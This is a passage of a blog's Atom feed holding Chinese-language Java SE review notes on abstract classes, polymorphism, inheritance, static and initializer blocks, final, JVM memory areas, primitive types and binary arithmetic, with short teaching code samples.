    <content type="html"><![CDATA[<h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><ul><li>关键字：<code>abstract</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abstract class 类名 &#123;&#125;//抽象类</span><br><span class="line">public abstract void eat();//抽象方法</span><br></pre></td></tr></table></figure><ul><li><p>特点：</p><blockquote><p>1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口</p><p>2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化</p><p>3、abstract强制子类重写</p></blockquote></li><li><p>抽象类的几个问题：</p><blockquote><p>1、为什么不直接定义空方法？</p><p>解答：抽象类可以正确的引导使用者正确使用它们，<code>减少被误用</code></p><p>2、抽象类有什么作用？</p><p>解答：增强程序的<code>扩展性</code>和<code>兼容性</code>，<code>规范编程</code></p></blockquote></li><li><p>抽象类中的面试题：</p><blockquote><p>1、一个抽象类可以没有抽象方法，抽象类的意义是防止别人创建这个类的对象（抽象类不能被实例化）</p><p>2、<code>abstract</code>不能和<code>static</code>共存</p><p>原因：<code>static</code>让这个方法是静态方法，而静态方法可以用<code>类名.方法名</code>调用，而静态方法可以<code>类名.方法名</code>调用的底层原因是这个方法的对象已经在程序运行时就被创建，并且存到静态区域了，但是抽象方法是抽象的，不是具体的，所以它不能被实例化，进而<code>abstract</code>不能和<code>static</code>共存。</p><p>3、<code>abstract</code>不能和<code>final</code>共存</p><p>原因：<code>abstract</code>强制子类重写，而<code>final</code>表示最终的，它不让子类重写，这里形成了冲突。</p><p>4、<code>abstract</code>不能和<code>private</code>共存</p><p>原因：<code>abstract</code>强制子类重写，而<code>private</code>让子类访问不到，所以它们两个修饰符形成了冲突。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;抽象类&quot;&gt;&lt;a href=&quot;#抽象类&quot; class=&quot;headerlink&quot; title=&quot;抽象类&quot;&gt;&lt;/a&gt;抽象类&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;关键字：&lt;code&gt;abstract&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highligh
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="抽象类" scheme="http://liuhaoan.github.io/tags/%E6%8A%BD%E8%B1%A1%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_多态</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%A4%9A%E6%80%81/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-多态/</id>
    <published>2019-04-07T07:58:33.000Z</published>
    <updated>2019-04-08T08:44:43.116Z</updated>
    
    <content type="html"><![CDATA[<h1 id="多态前提"><a href="#多态前提" class="headerlink" title="多态前提"></a>多态前提</h1><ul><li>a : 要有继承关系。</li><li>b : 要有方法重写。</li><li>c : 要有父类引用指向子类对象。<blockquote><p>例有一个父类<code>fu</code>和一个子类<code>zi</code>，那么父类引用子类对象为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fu a = new zi();</span><br></pre></td></tr></table></figure></blockquote></li></ul><h1 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h1><ul><li>编译、运行看左边(父类)</li></ul><blockquote><p>也就是创建对象后，<code>子类引用对象就优先调用子类(这样就不是多态了，因为它没有父类引用子类对象)</code>，<code>父类引用对象就优先调用父类（编译运行看左边）</code></p></blockquote><ul><li>解析：创建对象时，首先在堆中创建子类的对象（this），而这个子类的对象中有一个区域指向super，如果引用这个对象的是<code>父类</code>那么这个引用指向<code>super</code>区域，否则指向<code>this</code>区域</li></ul><h1 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h1><ul><li>编译看左边(父类)、运行看右边(子类)。<code>动态绑定</code></li></ul><blockquote><p>ps：父类中一定要有和子类一样的方法，父类中的那个方法可以理解为一个跳板跳转到子类中的方法中。</p></blockquote><h1 id="静态成员方法"><a href="#静态成员方法" class="headerlink" title="静态成员方法"></a>静态成员方法</h1><ul><li>与成员变量同理，<code>编译、运行看左边(父类)</code>，所以<code>多态中静态方法不存在重写</code></li></ul><h1 id="多态的弊端"><a href="#多态的弊端" class="headerlink" title="多态的弊端"></a>多态的弊端</h1><ul><li>父类引用不能使用子类<code>特有的属性和行为</code>，但是能通过<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zi b = (zi)a;    //强转类型</span><br></pre></td></tr></table></figure></li></ul><h1 id="多态的好处"><a href="#多态的好处" class="headerlink" title="多态的好处"></a>多态的好处</h1><blockquote><p>1、提高了代码的<code>维护性</code>(继承保证)</p><p>2、提高了代码的<code>扩展性</code>(由多态保证)</p></blockquote><h1 id="多态的使用"><a href="#多态的使用" class="headerlink" title="多态的使用"></a>多态的使用</h1><blockquote><p>1、开发是很少在创建对象的时候使用多态，而是直接创建<code>子类引用子类对象</code></p><p>2、在需要使用方法使代码简洁时，<code>当做参数</code>使用多态效果最好，因为<code>扩展性强</code></p><p>比如：现有三个类“<code>动物</code>”“<code>狗</code>”“<code>猫</code>”动物是父类，当我们有很多只狗和猫需要跑时，就可以使用<code>方法函数</code>来使代码简洁，在调用这个方法时可以<code>创建好一个 狗 或 猫  的对象然后传给参数</code>，这就需要使用到多态了，<code>如果不使多态</code>那么就需要给狗和猫分别创建一个函数。</p><ul><li><p>不过<code>在方法中使用多态</code>还有一个问题：狗 和 猫 都有各自<code>特有的功能与属性</code>，如果调用猫的功能，但是传入的对象是狗，那么就出错了。</p></li><li><p>解决方法：关键字    instanceof</p></li></ul><p>ps：了解一下，开发中用到的不多，一般都用到<code>方法重写</code></p><ul><li>代码实例：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对象变量A   instanceof   对象变量B</span><br><span class="line">//如果是相同的类返回true</span><br></pre></td></tr></table></figure></li></ul></blockquote><h1 id="多态中的代码分析"><a href="#多态中的代码分析" class="headerlink" title="多态中的代码分析"></a>多态中的代码分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">public void show() &#123;</span><br><span class="line">show2();//这里调用的是子类中的show方法</span><br><span class="line">&#125;</span><br><span class="line">public void show2() &#123;</span><br><span class="line">System.out.println(&quot;我&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class B extends A &#123;</span><br><span class="line">public void show2() &#123;</span><br><span class="line">System.out.println(&quot;爱&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class C extends B &#123;</span><br><span class="line">public void show() &#123;</span><br><span class="line">super.show();</span><br><span class="line">&#125;</span><br><span class="line">public void show2() &#123;</span><br><span class="line">System.out.println(&quot;你&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Test2DuoTai &#123;</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">A a = new B();</span><br><span class="line">a.show();//返回一个爱</span><br><span class="line"></span><br><span class="line">B b = new C();</span><br><span class="line">b.show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>得出结果：<blockquote><p>在多态中，父类中的方法调用另一个方法，且<code>被调用的方法</code>都存在于子类与父类中的情况下，优先调用子类的方法，也就是<code>父类方法</code>成为了一个跳板，跳转到了子类的方法中</p></blockquote></li><li>还是那句话：<blockquote><p>成员<code>方法</code>编译看左边(父类)、运行看右边(子类)</p><p>成员<code>变量</code>编译看左边(父类)、运行看左边(父类)</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;多态前提&quot;&gt;&lt;a href=&quot;#多态前提&quot; class=&quot;headerlink&quot; title=&quot;多态前提&quot;&gt;&lt;/a&gt;多态前提&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;a : 要有继承关系。&lt;/li&gt;
&lt;li&gt;b : 要有方法重写。&lt;/li&gt;
&lt;li&gt;c : 要有父类引用指向子类
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="多态" scheme="http://liuhaoan.github.io/tags/%E5%A4%9A%E6%80%81/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_代码块与继承</title>
    <link href="http://liuhaoan.github.io/2019/04/06/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%8E%E7%BB%A7%E6%89%BF/"/>
    <id>http://liuhaoan.github.io/2019/04/06/javaSE复习之——面向对象-代码块与继承/</id>
    <published>2019-04-06T02:08:03.000Z</published>
    <updated>2019-04-08T08:44:43.114Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、静态方法与静态变量"><a href="#一、静态方法与静态变量" class="headerlink" title="一、静态方法与静态变量"></a>一、静态方法与静态变量</h1><h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><ul><li>如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象</li></ul><h2 id="如何防止创建本类对象？"><a href="#如何防止创建本类对象？" class="headerlink" title="如何防止创建本类对象？"></a>如何防止创建本类对象？</h2><ul><li>可以直接私有构造方法<br>  <code>private 类名（）{}</code></li></ul><h2 id="如何创建一个静态方法？"><a href="#如何创建一个静态方法？" class="headerlink" title="如何创建一个静态方法？"></a>如何创建一个静态方法？</h2><ul><li>在方法中加<code>static</code>修饰，那么这个方法是静态方法（函数）<blockquote><p>在载入类的时候就这个方法就已经在类的<code>静态区</code>创建，不需要创建对象即可调用</p></blockquote></li></ul><h2 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h2><ul><li>在变量前加入static那么这个变量是静态变量，与上同理，不过这个变量是共享的。<blockquote><p>比如</p><p>第一条命令给这个变量赋值“<code>张三</code>”</p><p>第二条命令又给这个变量赋值“<code>李四</code>”</p><p>那么之后调用这个变量时，这个变量返回“<code>李四</code>”</p></blockquote></li></ul><h1 id="二、构造方法-与-代码块"><a href="#二、构造方法-与-代码块" class="headerlink" title="二、构造方法 与 代码块"></a>二、构造方法 与 代码块</h1><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><ul><li><p>构造方法和类名相同，在创建这个类的对象的时候系统就会自动调用，也就是起到初始化的效果</p><blockquote><p>系统会自动创建<code>空参构造</code>，顶层的类系统自动继承object类，但是object类的构造方法没有任何输出</p></blockquote></li></ul><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><h4 id="局部代码块"><a href="#局部代码块" class="headerlink" title="局部代码块"></a>局部代码块</h4><ul><li>它在方法中出现；它可以限定变量生命周期，及早释放，提高内存利用率</li></ul><h4 id="构造代码块-初始化块"><a href="#构造代码块-初始化块" class="headerlink" title="构造代码块 (初始化块)"></a>构造代码块 (初始化块)</h4><ul><li>构造代码块可以在一个类中执行，执行完就弹栈，</li><li><p>例：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class Deom&#123;&#123;这就是构造代码块&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ps：每次创建这个类的对象构造代码块就会执行一次，并且优先执行</p></blockquote></li><li><p>构造代码块可以把一些<code>初始化的代码</code>放在其中，<code>每次调用构造都执行</code>，并且<code>在构造方法之前执行</code></p><blockquote><p>ps：实际上构造方法开发中用到的不多，但是面试可能会问</p></blockquote></li></ul><ul><li>构造代码块可以做的功能：<blockquote><p>我们可以做诸如统计创建对象的次数等功能。</p></blockquote></li></ul><h4 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h4><ul><li><p>例：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static &#123;&#125;</span><br></pre></td></tr></table></figure></li><li><p>作用：</p><blockquote><p>用于给类进行初始化，在<code>加载的时候就执行</code>，并且<code>只执行一次</code>。</p><p>一般用于<code>加载驱动</code>，一般情况下，如果有些代码需要在项目启动的时候就执行，这时候就需要静态代码块。</p><p>比如一个项目启动需要加载的很多配置文件等资源，我们就可以都放入静态代码块中。</p></blockquote></li><li><p><code>注意事项：</code></p><blockquote><p>1、静态代码块不能访问普通变量</p><p>2、静态代码块在 <code>类</code> 中，<code>优先于主方法</code>（<code>面试题</code>）</p><p>3、静态代码块 &gt; 构造代码块 &gt; 构造函数（方法）&gt; 普通代码块</p></blockquote></li></ul><h4 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h4><blockquote><p>ps：继承与升级一般都用作系统升级</p><p><code>父类 &gt; 子类</code></p></blockquote><ul><li><p>继承的定义</p><blockquote><p><code>class 子类(当前类) extends 父类(继承的类)</code></p><p>ps：继承后调用子类等于调用父类，子类可以什么都不写，可以理解为：继承后子类相当于有了父类的方法</p></blockquote></li><li><p>继承的好处：</p><blockquote><p>1、可以提升代码的复用性，不需要打太多重复的代码</p><p>2、提升了代码的维护性，改一个代码就可以起到全局的作用，不容易出错</p><p>3、是多态的前提</p></blockquote></li><li><p>继承的弊端：</p><blockquote><p>1、耦合性非常强，父类有的一些属性可能是子类不需要的</p></blockquote></li><li><p>开发原则：</p><blockquote><p><code>高内聚、低耦合</code></p><p>耦合：类与类的关系</p><p>内聚：自己完成某件事的能力</p></blockquote></li><li><p>在java中继承的特点：</p><blockquote><p>1、Java<code>只支持单继承</code>不支持多继承（一个孩子只能有一个爹）</p><p>2、<code>可以多层继承</code>（继承体系），也就是可以继承爷爷</p><p>3、想看这个体系<code>所有功能</code>就看最底层类，也就是儿子类</p><p>4、想看这个体系<code>共性功能</code>就要看顶层类，也就是爷爷类</p></blockquote></li><li><p>注意事项</p><blockquote><p>1、子类只能继承父类所有<code>非私有</code>的成员（方法和变量）</p><p>2、<code>子类不能继承父类的构造方法</code>，因为构造方法必须和类名一样，而继承是不一样的，但可以通过<code>super</code>关键字去访问父类的构造方法</p><p>3、<code>不要为了部分功能而去继承</code>，因为<code>继承体现的是一种关系</code>，就算有相同属性也不一定继承。</p><p>比如：“猫”和“狗”的类，它们虽然都有4条腿，但是却不能继承，因为他们是同级关系，而不是父子关系，但比如有“动物”“猫”“狗”的类，那么“猫”和“狗”都可以继承“动物”的类。</p><p>4、<code>子父类如果出现相同变量那么会采取就近原则</code>，但是在真正的项目开发中不会出现这种情况，因为没有意义</p><p>5、子类<code>无论如何</code>都会访问父类中的<code>构造方法</code></p><p>6、<code>在全是静态方法的类中，构造方法必须私有化</code>，这样防止别人创建这个类的对象</p></blockquote></li></ul><h4 id="this和super"><a href="#this和super" class="headerlink" title="this和super"></a>this和super</h4><ul><li>this：<blockquote><p>代表<code>当前对象的引用</code>，如果继承了父类，那么也可以引用父类</p></blockquote></li><li>super：<blockquote><p>代表<code>对父类的引用</code></p></blockquote></li></ul><ul><li><p>一些使用实例：</p><ul><li>this.成员变量名<blockquote><p>调用本类成员变量，也可以调用父类的，但是<code>采用就近原则</code></p></blockquote></li><li><p>super.成员变量名</p><blockquote><p>调用父类的成员变量</p></blockquote><p>ps：成员变量名可以是方法名</p></li><li><p>调用父类中的构造方法:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">super(...);</span><br></pre></td></tr></table></figure></li><li><p>调用本类中的构造方法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this(...);</span><br></pre></td></tr></table></figure><p>ps：一个方法里只能调用其中的一个</p></li></ul></li></ul><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li><p>类中的构造方法系统都自带<code>super()；</code>但是被隐藏了，作用是访问父类的空参构造，如果父类没用空参构造，我们需要访问父类中的有参构造，那么就可以<code>super（参数1，参数2....）；</code>也可以用this调用本类的有参构造，进而间接调用父类有参构造</p></li><li><p><code>构造方法</code>的调用都是从上到下，即<code>从父类调用到子类</code>，可以理解为一个队列</p></li><li><p>继承中的面试</p><blockquote><p>1、假设有  <code>子类方法、子类、父类</code> 且其中都有一个num的变量，那么：<code>num</code>用方法中的变量，<code>this.num</code>调用本类中的变量，<code>super.num</code>调用父类中的变量</p><p>2、在继承中不要忘记了<code>每个构造方法都会有一个super（）；访问父类</code></p><p>3、override   重写：<code>子类中</code>出现了和<code>父类中方法声明一模一样的方法</code>。与返回值类型有关,返<code>回值类型是一致的</code></p><p>4、overload  重载：<code>本类中</code>出现的<code>方法名一样</code>，<code>参数列表不同</code>的方法。<code>与返回值类型无关</code>。</p></blockquote></li><li><p>继承中的成员方法关系</p><blockquote><p>、子、父类有相同方法并且返回值类型也一样，那么会<code>调用子类的方法</code>，也叫<code>方法重写</code></p></blockquote></li></ul><ul><li>final概述<ul><li>它可以用来修饰 <code>类与变量</code> 修饰之后表示它是<code>“最终的”</code>不能被继续操作了</li></ul></li></ul><ul><li>final修饰特点<ul><li>修饰类，类不能被继承</li><li>修饰变量：<code>变量</code>就变成了<code>常量</code>，<code>只能被赋值一次</code>，通常与<code>public static</code>配套使用</li><li>修饰方法：方法<code>不能被重写</code>，表示最终方法。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一、静态方法与静态变量&quot;&gt;&lt;a href=&quot;#一、静态方法与静态变量&quot; class=&quot;headerlink&quot; title=&quot;一、静态方法与静态变量&quot;&gt;&lt;/a&gt;一、静态方法与静态变量&lt;/h1&gt;&lt;h2 id=&quot;静态方法&quot;&gt;&lt;a href=&quot;#静态方法&quot; class=&quot;
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="代码块" scheme="http://liuhaoan.github.io/tags/%E4%BB%A3%E7%A0%81%E5%9D%97/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——java的五大内存区域</title>
    <link href="http://liuhaoan.github.io/2019/04/05/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94java%E7%9A%84%E4%BA%94%E5%A4%A7%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F/"/>
    <id>http://liuhaoan.github.io/2019/04/05/javaSE复习之——java的五大内存区域/</id>
    <published>2019-04-05T15:40:17.000Z</published>
    <updated>2019-04-08T08:44:43.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="五大内存区域"><a href="#五大内存区域" class="headerlink" title="五大内存区域"></a>五大内存区域</h1><ul><li>堆</li><li>虚拟机栈</li><li>本地方法栈</li><li>方法区</li><li><p>寄存器区</p><blockquote><p>ps：我们主要用：虚拟机栈、方法区、堆</p></blockquote></li></ul><h1 id="Java程序运行过程"><a href="#Java程序运行过程" class="headerlink" title="Java程序运行过程"></a>Java程序运行过程</h1><ul><li>1、加载字节码文件到方法区（.class文件）</li><li>2、程序代码依次进栈（jvm执行main方法）</li></ul><h1 id="堆（heap）："><a href="#堆（heap）：" class="headerlink" title="堆（heap）："></a>堆（heap）：</h1><blockquote><p>最大的一块内存，存放对象实例的地方</p><ul><li>1、Java堆是垃圾收集器管理的主要区域，也称GC堆。</li><li>2、Java堆物理上可不连续，逻辑上连续。</li><li>3、堆中没有完成实例分配，并且对也无法在扩展时抛出 OutOfMemoryError异常</li></ul></blockquote><h1 id="虚拟机栈（stack）："><a href="#虚拟机栈（stack）：" class="headerlink" title="虚拟机栈（stack）："></a>虚拟机栈（stack）：</h1><blockquote><p>java方法执行时的内存模型</p></blockquote><ul><li>栈帧<blockquote><p>1、<code>每个方法</code>都会在虚拟机栈中创建一个对应的栈帧，用于存储<code>局部变量表</code>，<code>操作数栈</code>，<code>动态链接</code>，<code>方法出口</code>等信息。</p><p>2、一个方法的调用到结束就对应这一个栈帧从虚拟机栈<code>入栈到出栈</code>。</p></blockquote></li></ul><ul><li>局部变量表<blockquote><p>1、存放编译期可知在方法中各种<code>基本数据类型</code>和<code>对象</code>的引用，基本数据类型直接存值, 引用数据类型存地址。</p></blockquote></li></ul><p>#本地方法栈：</p><blockquote><p>本地方法栈和虚拟机栈作用相似，虚拟机栈为虚拟机执行java方法（字节码）服务，本地方法栈为jvm使用Native方法服务</p></blockquote><ul><li><p><code>本地方法</code> 关键字 <code>native</code> ，这些方法一般用来调用本地方法库中的方法这些方法，操作底层大多用C 实现。</p></li><li><p>有的虚拟机将<code>本地方法栈</code>和<code>虚拟机栈</code>合在一起，如<code>HotSpot</code>。</p></li></ul><h1 id="方法区："><a href="#方法区：" class="headerlink" title="方法区："></a>方法区：</h1><ul><li>存已经被虚拟机加载的类信息（Class对象）、<code>常量</code>、<code>静态变量</code>、即时编译器JIT编译过后的<code>代码数据</code>。</li><li><p>jdk <code>1.7</code>、1.8 对方法区做出了修改，1.8 取消了方法区。</p><blockquote><p>1、方法区被Java虚拟机规范描述为堆的一个逻辑部分，但它不是堆，有一个别名叫非堆Non-Heap</p><p>2、 jdk1.6 及之前方法区位于永久代(PermGen)，永久代和堆相互隔离。</p><p>3、方法区可以不需要连续的内存空间，也可以固定大小，也可以扩展，也可以不实现垃圾收集，如果实现则主要针对常量池的回收和类型的卸载。</p></blockquote></li><li><p>运行时常量池</p><blockquote><p>1、在方法区，用来存放编译期生成的各种符号引用和字面量</p><p>2、编译期将各种<code>符号引用</code>和<code>字面量</code>放置在class文件的常量池中，解析后在运行时常量池，字符串在方法区的字符串常量池中（1.7之前），方法运行时<code>复制</code>到局部变量表中。1.7开始字符串<code>常量池</code>被移入堆中。</p><p>符号引用： String ss = “asdsfg”  ss这个符号就是符号引用。解析阶段解析为直接引用</p><p>字面量： 值本身 如 asdfg</p><p>常量池中有各种虚拟机正常运行需要的字符串，所以有些即使不创建也还会存在于字符串常量池中如”java”。</p></blockquote></li></ul><h1 id="寄存器（程序计数器）："><a href="#寄存器（程序计数器）：" class="headerlink" title="寄存器（程序计数器）："></a>寄存器（程序计数器）：</h1><ul><li>占用较小的一块内存空间，当执行Java方法时<code>记录正在执行的虚拟机字节码指令地址</code>，如果执行Native方法则计时器值为空。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;五大内存区域&quot;&gt;&lt;a href=&quot;#五大内存区域&quot; class=&quot;headerlink&quot; title=&quot;五大内存区域&quot;&gt;&lt;/a&gt;五大内存区域&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;堆&lt;/li&gt;
&lt;li&gt;虚拟机栈&lt;/li&gt;
&lt;li&gt;本地方法栈&lt;/li&gt;
&lt;li&gt;方法区&lt;/li&gt;
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="javaSE" scheme="http://liuhaoan.github.io/tags/javaSE/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——数据类型</title>
    <link href="http://liuhaoan.github.io/2019/04/05/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <id>http://liuhaoan.github.io/2019/04/05/javaSE复习之——数据类型/</id>
    <published>2019-04-05T12:47:43.000Z</published>
    <updated>2019-04-08T08:44:43.113Z</updated>
    
    <content type="html"><![CDATA[<h4 id="基本数据分为四大类"><a href="#基本数据分为四大类" class="headerlink" title="基本数据分为四大类"></a>基本数据分为四大类</h4><blockquote><p>重要：以后面试可能会问范围</p><p>注：通常在复制 long  float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D</p></blockquote><ul><li>整数型（整数常亮默认为int类型）<ul><li><code>byte</code>：占一个字节   <code>-128</code> ~ <code>127</code></li><li><code>short</code>：占两个字节   <code>-2^15</code> ~ <code>2^15-1</code></li><li><code>int</code>：占四个字节   <code>-2^31</code> ~ <code>2^31-1</code></li><li><code>long</code>：占八个字节   <code>-2^63</code> ~ <code>2^63-1</code></li></ul></li></ul><ul><li>浮点型（小数型，默认小数是double类型）<ul><li><code>float</code>：占<code>四个字节</code><blockquote><p>-2^128 ~ 2^128        绝对保证精度6位，但有7位有效数字</p></blockquote></li><li><code>double</code>：占<code>八个字节</code><blockquote><p>-2^1024 ~ 2^1024        绝对保证精度15位，但有16位有效数字</p></blockquote></li></ul></li></ul><ul><li>字符型<ul><li><code>char</code>：占两个字节   0 ~ 65535</li></ul></li></ul><ul><li>布尔型（判断）<ul><li><code>boolean</code>：理论<code>八分之一字节</code>，因为只要0和1就能分别决定false和true了，但是boolean并没有明确指定大小</li></ul></li></ul><blockquote><p>ps：<code>float</code>由32个二进制位组成，1位代表符号、8位代表指数位 00000000-11111111 同等与 0 - 255 其中 255代表无穷大，指数范围就是-126 ~ 127这比long的63大，所以float虽然才四个字节但是比long范围大</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;基本数据分为四大类&quot;&gt;&lt;a href=&quot;#基本数据分为四大类&quot; class=&quot;headerlink&quot; title=&quot;基本数据分为四大类&quot;&gt;&lt;/a&gt;基本数据分为四大类&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;重要：以后面试可能会问范围&lt;/p&gt;
&lt;p&gt;注：通常在复制 
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="数据类型" scheme="http://liuhaoan.github.io/tags/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——进制编码</title>
    <link href="http://liuhaoan.github.io/2019/04/05/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81/"/>
    <id>http://liuhaoan.github.io/2019/04/05/javaSE复习之——进制编码/</id>
    <published>2019-04-05T12:27:44.000Z</published>
    <updated>2019-04-08T08:44:43.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="进制的运算"><a href="#进制的运算" class="headerlink" title="进制的运算"></a>进制的运算</h2><ul><li><p>二进制向右移动两位 ：15 &gt;&gt; 2 = 3</p><ul><li>ps：1111 向右移动两位 等于 0011 = 3</li></ul></li><li><p>二进制向左移动两位 ：15 &lt;&lt; 2 = 60</p><ul><li>ps：1111 向左移动两位 等于 111100 = 60</li></ul></li><li><p>异或运算 ：2 ^ 3 = 1</p><ul><li>例子：0010 ^ 0011 = 0001<blockquote><p>ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样</p></blockquote></li></ul></li><li><p>与运算 ：2 &amp; 3 = 2</p><ul><li>例子：0010 &amp; 0011=0010<blockquote><p>“与”运算中也是二进制位的运算，只要有一个是0那么结果就是0</p></blockquote></li></ul></li></ul><h2 id="java中的数据表示法"><a href="#java中的数据表示法" class="headerlink" title="java中的数据表示法"></a>java中的数据表示法</h2><ul><li>在java中数据前面加  0x表示16进制   0b表示二进制   0表示8进制</li></ul><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><blockquote><p>任何进制转10进制都是    每一位  第某位的数据 乘 被转换的进制数 的 第某位索引次幂  相加</p></blockquote><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="八转10："><a href="#八转10：" class="headerlink" title="八转10："></a>八转10：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0120=1 * 8 ^ 2 + 2 * 8 ^ 1 + 0 * 8 ^ 0 = 80</span><br></pre></td></tr></table></figure><blockquote><p>10进制转任何进制都是    除 要转换的进制数 然后取余数，以此类推，最后得出的数据为：进制数从左到右 = 